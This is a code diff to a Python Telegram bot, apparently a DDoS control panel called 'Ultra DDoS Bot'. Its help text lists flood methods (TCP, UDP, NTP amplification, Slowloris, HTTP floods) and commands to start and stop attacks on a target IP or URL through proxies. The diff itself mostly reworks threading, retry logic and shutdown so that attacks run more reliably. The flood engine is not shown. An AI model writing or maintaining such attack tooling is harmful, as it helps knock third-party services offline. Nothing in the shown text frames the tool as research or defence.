@@ -9,6 +9,7 @@ import json
 import logging
 import psutil
 from utils import humanbytes, format_time, get_network_latency
+from concurrent.futures import ThreadPoolExecutor
 
 logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', level=logging.INFO)
 logger = logging.getLogger("DDoSBot")
@@ -16,7 +17,7 @@ logger = logging.getLogger("DDoSBot")
 with open("config.json", "r") as f:
     config = json.load(f)
 
-bot = telebot.TeleBot(config["telegram_token"])
+bot = telebot.TeleBot(config["telegram_token"], threaded=True)
 attacks = {}
 proxies = set()
 message_ids = {}
@@ -76,14 +77,19 @@ def format_status(attack):
     )
 
 def run_bot():
-    bot.polling(none_stop=True)
+    try:
+        bot.polling(none_stop=True, timeout=60, allowed_updates=None)
+    except Exception as e:
+        logger.error(f"Polling error: {e}")
+        sleep(5)  # Chờ 5 giây trước khi retry
+        run_bot()  # Tự động retry polling
 
 @bot.message_handler(commands=['start'])
 def start(message):
     bot.reply_to(message, (
         "🌟 *Ultra DDoS Bot* 🌟\n"
         "🔧 *Commands*:\n"
-        "  `/attack <method> <target> [duration]` - Start attack (Layer4: IP:port, Layer7: URL)\n"
+        "  `/attack   [duration]` - Start attack (Layer4: IP:port, Layer7: URL)\n"
         "  `/stop` - Stop attack\n"
         "  `/proxies` - Check proxies\n"
         "💡 *Supported Methods*: TCP, UDP, NTP, SLOWLORIS, GET, POST, HTTP2, CFB, FLOOD"
@@ -94,7 +100,7 @@ def attack(message):
     global proxies, referers, user_agents
     args = message.text.split()[1:]
     if len(args) < 2:
-        bot.reply_to(message, "❌ *Usage*: `/attack <method> <target> [duration]`", parse_mode="Markdown")
+        bot.reply_to(message, "❌ *Usage*: `/attack   [duration]`", parse_mode="Markdown")
         return
 
     method, target = args[0], args[1]
@@ -126,9 +132,16 @@ def attack(message):
         ), parse_mode="Markdown")
         message_ids[message.chat.id] = msg.message_id
 
-        loop.create_task(attack.run())
+        # Sử dụng executor để chạy attack trong thread chính
+        def run_attack():
+            loop.run_until_complete(attack.run())
+
+        # Chạy attack trong thread riêng
+        executor = Thread(target=run_attack, daemon=True)
+        executor.start()
         attacks[message.chat.id] = attack
 
+        # Chạy cập nhật trạng thái trong vòng lặp chính
         async def update_status():
             while attack.running:
                 try:
@@ -168,7 +181,11 @@ def main():
     bot_thread = Thread(target=run_bot, daemon=True)
     bot_thread.start()
     logger.info("Bot started.")
-    loop.run_forever()
+    try:
+        loop.run_forever()
+    except KeyboardInterrupt:
+        loop.stop()
+        logger.info("Bot stopped gracefully.")
 
 if __name__ == "__main__":
     main()
